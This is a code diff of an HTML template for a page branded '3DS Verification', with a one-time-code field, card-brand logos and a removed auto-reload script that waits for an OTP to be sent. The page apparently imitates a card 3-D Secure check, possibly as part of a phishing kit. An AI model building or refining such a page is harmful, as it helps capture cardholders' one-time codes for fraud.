@@ -6,6 +6,8 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Code Verification Text</title>
+    
+    <link rel="icon" type="image/x-icon" href="/static/assets/imgs/favicon.ico">
     <link rel="stylesheet" href="/static/assets/custom_css/card_details.css">
 
 </head>
@@ -13,7 +15,7 @@
 <body>
 
     <div class="main">
-        <div id="logo-bar">
+        <div class="logo-bar">
             <img id="img" src="/static/assets/imgs/logo.png">
             <p> - 3DS Verification</p>
 
@@ -25,33 +27,16 @@
             <input class="special_input" id="text_otp" type="text">
             <button class="btn" type="submit">Authenticate</button>
         </div>
-<div class="cards">
-    <img src="/static/assets/imgs/m_c.png">
-    <img src="/static/assets/imgs/v_c.jpg">
-</div>
+        <div class="cards">
+            <img src="/static/assets/imgs/m_c.png">
+            <img src="/static/assets/imgs/v_c.jpg">
+        </div>
+        <footer>
+            <div class="logo-bar">
+                <img id="pwrby" src="/static/assets/imgs/pwrby.jpeg" alt="">
+            </div>
+        </footer>
     </div>
-
-
-        <!-- {% if is_otp_received.is_otp_sent == False %}
-<h4>OTP Code is Underway</h4>
-{% else %} -->
-
-
-
-        <!-- <form action="" method="post">
-        {% csrf_token %}
-        <label class="label" for="opt_code">Enter OTP:</label>
-        <br>
-        <input class="input" type="text" name="opt_code">
-    <br>
-    <button id="button" type="submit" name="btnAuthenticate">Authenticate</button>
-</form>
-{% endif %} -->
-        <!-- <script type="text/javascript">
-    setTimeout(function () {
-      location.reload();
-    }, 8 * 1000);
-</script> -->
 </body>
 
 </html>
